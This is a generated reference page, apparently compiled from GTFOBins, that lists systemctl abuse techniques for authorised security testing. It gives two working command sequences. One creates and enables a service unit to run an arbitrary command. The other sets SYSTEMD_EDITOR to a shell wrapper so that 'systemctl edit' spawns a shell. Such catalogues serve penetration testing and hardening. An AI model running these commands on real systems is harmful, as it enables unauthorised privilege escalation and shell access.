---
parsed_by: focuslocust
source: commands
type: generated
---
# systemctl Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## systemctl

Tool page: [systemctl](../../tools/linux/systemctl.md)

### inherit

```text
systemctl
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/systemctl` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo '[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/systemctl` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/systemctl` |
| Evidence | Function example preserved from source parser. |
